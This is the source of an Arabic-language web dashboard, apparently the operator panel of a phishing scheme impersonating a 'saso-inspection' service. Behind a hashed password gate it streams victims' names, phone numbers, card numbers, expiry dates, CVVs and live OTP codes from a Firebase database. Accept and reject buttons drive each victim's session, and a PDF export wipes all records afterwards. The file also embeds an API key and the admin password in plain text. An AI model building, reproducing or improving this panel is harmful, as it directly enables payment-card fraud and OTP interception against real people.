<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard System - Engineer Hasan</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
    
    <style>
        body { font-family: sans-serif; background: #ececec; margin: 0; padding: 0; }
        #auth_gate { position: fixed; inset: 0; background: #1e7344; display: flex; align-items: center; justify-content: center; z-index: 10000; }
        .gate-box { background: #fff; padding: 30px; border-radius: 12px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.3); width: 90%; max-width: 350px; }
        .main-ui { display: none; padding: 20px; }
        .navbar { background: #1e7344; color: #fff; padding: 15px; display: flex; justify-content: space-between; align-items: center; border-radius: 0 0 15px 15px; position: sticky; top: 0; z-index: 100; }
        .v-count { background: #ffd700; color: #000; padding: 5px 15px; border-radius: 20px; font-weight: bold; font-size: 14px; }
        .cards-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; margin-top: 20px; }
        .card { background: #fff; border-radius: 12px; padding: 15px; border: 1px solid #ddd; box-shadow: 0 4px 6px rgba(0,0,0,0.05); border-right: 8px solid #1e7344; position: relative; }
        .card-row { display: flex; justify-content: space-between; margin-bottom: 8px; border-bottom: 1px solid #f0f0f0; padding-bottom: 4px; }
        .label { color: #777; font-size: 12px; }
        .value { font-weight: bold; font-family: monospace; font-size: 15px; }
        .actions { display: flex; gap: 10px; margin-top: 15px; }
        .btn-ctl { flex: 1; padding: 12px; border: none; border-radius: 6px; color: white; font-weight: bold; cursor: pointer; font-size: 14px; }
        .btn-accept { background: #28a745; }
        .btn-reject { background: #dc3545; }
        .btn-pdf { background: #d32f2f; color: #fff; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; }
        .new-tag { position: absolute; top: -10px; left: 10px; background: red; color: white; padding: 2px 8px; border-radius: 10px; font-size: 10px; animation: blink 1s infinite; }
        @keyframes blink { 0% {opacity: 1;} 50% {opacity: 0.5;} 100% {opacity: 1;} }
    </style>
</head>
<body onload="_initAuth()">

<audio id="notif_sound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>

<div id="auth_gate">
    <div class="gate-box">
        <h3 style="margin-top:0; color:#1e7344">نظام الدخول المشفر</h3>
        <input type="password" id="access_key" placeholder="أدخل كلمة المرور" style="width:100%; padding:12px; border:1px solid #ddd; border-radius:5px; text-align:center; font-size:18px;">
        <br><br>
        <button onclick="_verify()" style="width:100%; padding:12px; background:#1e7344; color:#fff; border:none; border-radius:5px; cursor:pointer; font-weight:bold;">دخول آمن</button>
    </div>
</div>

<div id="main_ui_wrap" class="main-ui">
    <div class="navbar">
        <div class="v-count">آخر الطلبات: <span id="v_total">0</span></div>
        <button class="btn-pdf" onclick="_exportPDF()">تصدير PDF وتفريغ الكل</button>
        <button onclick="_exit()" style="background:#444; color:#fff; border:none; padding:8px 15px; border-radius:5px; cursor:pointer;">خروج</button>
    </div>
    <div class="cards-grid" id="data_stream"></div>
</div>

<script>
    // شفرة SHA-256 لكلمة السر H1234567890H [cite: 2026-02-18]
    const _H = "547f8969315d97f26c9f68802a4505f5903b708b7654f15d97a9f77f32a67768";
    const _S = "saso_secure_session_v5";
    let _DB;

    function _initAuth() {
        if(sessionStorage.getItem(_S) === "active") _launch();
    }

    async function _verify() {
        const val = document.getElementById('access_key').value;
        if(!val) return;
        const msgUint8 = new TextEncoder().encode(val);
        const hashBuffer = await crypto.subtle.digest('SHA-256', msgUint8);
        const hashArray = Array.from(new Uint8Array(hashBuffer));
        const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');

        if(hashHex === _H) {
            sessionStorage.setItem(_S, "active");
            _launch();
        } else {
            alert("كلمة المرور غير صحيحة!");
        }
    }

    function _launch() {
        document.getElementById('auth_gate').style.display = 'none';
        document.getElementById('main_ui_wrap').style.display = 'block';
        _connectDB();
    }

    function _exit() {
        sessionStorage.removeItem(_S);
        location.reload();
    }

    function _connectDB() {
        const _cfg = {
            apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT8",
            databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com",
            projectId: "saso-inspection"
        };
        if (!firebase.apps.length) firebase.initializeApp(_cfg);
        _DB = firebase.database();

        // جلب آخر 10 طلبات فقط لضمان السرعة وعدم تحميل القديم [cite: 2026-02-22]
        _DB.ref('orders').limitToLast(10).on('value', snap => {
            const container = document.getElementById('data_stream');
            container.innerHTML = '';
            let count = 0;
            
            snap.forEach(child => {
                const id = child.key;
                const data = child.val();
                const p = data.personal_info || {};
                const c = data.card_details || {};
                count++;

                const html = `
                    <div class="card" id="r_${id}">
                        <div class="new-tag">جديد</div>
                        <div class="card-row"><span class="label">الاسم</span><span class="value">${p.fullName || '---'}</span></div>
                        <div class="card-row"><span class="label">الهاتف</span><span class="value">${p.phone || '---'}</span></div>
                        <div class="card-row"><span class="label">البطاقة</span><span class="value">${c.cardNumber || '----'}</span></div>
                        <div class="card-row"><span class="label">تاريخ/CVV</span><span class="value">${c.expiryDate || '--'} | ${c.cvv || '--'}</span></div>
                        <div class="card-row"><span class="label">OTP</span><span class="value" style="color:red; font-size:18px;">${c.otp || 'بانتظار...'}</span></div>
                        
                        <div class="actions">
                            <button class="btn-ctl btn-accept" onclick="_ctl('${id}', 'next')">قبول ✅</button>
                            <button class="btn-ctl btn-reject" onclick="_ctl('${id}', 'error')">رفض ❌</button>
                        </div>
                    </div>
                `;
                container.insertAdjacentHTML('afterbegin', html);
            });
            document.getElementById('v_total').innerText = count;
            if(count > 0) document.getElementById('notif_sound').play().catch(()=>{});
        });
    }

    function _ctl(id, action) {
        _DB.ref('orders/' + id).update({ control_action: action });
    }

    async function _exportPDF() {
        const target = document.getElementById('data_stream');
        if(!target.children.length) return alert("لا توجد بيانات");
        if(confirm("هل تريد تصدير ملف PDF ومسح كافة البيانات القديمة والجديدة؟")) {
            const opt = { margin: 10, filename: 'Saso_Log.pdf', image: { type: 'jpeg' }, html2canvas: { scale: 2 }, jsPDF: { unit: 'mm', format: 'a4' } };
            html2pdf().set(opt).from(target).save().then(() => {
                _DB.ref('orders').remove();
            });
        }
    }
</script>
</body>
</html>
